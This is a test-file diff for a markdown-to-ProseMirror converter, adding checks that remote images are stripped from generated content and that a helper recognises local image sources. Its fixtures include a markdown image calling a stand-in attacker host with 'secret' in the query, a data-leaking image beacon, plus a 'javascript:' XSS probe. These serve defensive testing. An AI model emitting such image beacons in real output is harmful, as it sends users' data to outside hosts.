@@ -1,8 +1,9 @@
 import { Node as PMNode } from "prosemirror-model";
-import { describe, expect, test } from "vitest";
+import { describe, expect, it, test } from "vitest";
 
 import {
   EMPTY_DOC,
+  isLocalImageSrc,
   isValidContent,
   json2md,
   type JSONContent,
@@ -1024,5 +1025,67 @@ describe("schema mirror", () => {
     for (const text of ["Title", "bold", "quote", "const x = 1;", "done"]) {
       expect(md).toContain(text);
     }
+  });
+});
+
+// Issue 642 : une image distante dans un contenu généré n'émet aucune requête.
+describe("md2json stripRemoteImages", () => {
+  it("retire une image distante de bloc et garde son texte alternatif", () => {
+    const json = md2json(
+      "Intro\n\n![logo](https://attaquant.example/p.png?d=secret)\n\nFin",
+      { stripRemoteImages: true },
+    );
+    expect(JSON.stringify(json)).not.toContain("attaquant.example");
+    expect(json.content?.map((node) => node.type)).toEqual([
+      "paragraph",
+      "paragraph",
+      "paragraph",
+    ]);
+    expect(json.content?.[1].content?.[0]).toEqual({
+      type: "text",
+      text: "logo",
+    });
+  });
+
+  it("retire une image distante au milieu d'un paragraphe ou d'une liste", () => {
+    const json = md2json(
+      "Voir ![](http://x.example/a.png) ici\n\n- item ![t](https://x.example/b.png)",
+      { stripRemoteImages: true },
+    );
+    const text = JSON.stringify(json);
+    expect(text).not.toContain("x.example");
+    expect(text).not.toContain('"image"');
+  });
+
+  it("garde les images locales et le contenu sans option", () => {
+    const local = md2json(
+      "![a](asset://localhost/tmp/a.png)\n\n![b](http://asset.localhost/tmp/b.png)\n\n![c](data:image/png;base64,AAAA)",
+      { stripRemoteImages: true },
+    );
+    expect(local.content?.filter((node) => node.type === "image")).toHaveLength(
+      3,
+    );
+
+    const untouched = md2json("![logo](https://example.com/p.png)");
+    expect(JSON.stringify(untouched)).toContain("https://example.com/p.png");
+  });
+});
+
+describe("isLocalImageSrc", () => {
+  it.each([
+    ["asset://localhost/a.png", true],
+    ["http://asset.localhost/a.png", true],
+    ["data:image/png;base64,AAAA", true],
+    ["blob:http://localhost/1", true],
+    ["/assets/syntheo-icon.png", true],
+    ["https://example.com/a.png", false],
+    ["http://example.com/a.png", false],
+    ["//example.com/a.png", false],
+    ["data:text/html,<b>x</b>", false],
+    ["javascript:alert(1)", false],
+    ["", false],
+    [undefined, false],
+  ])("%s → %s", (src, expected) => {
+    expect(isLocalImageSrc(src)).toBe(expected);
   });
 });
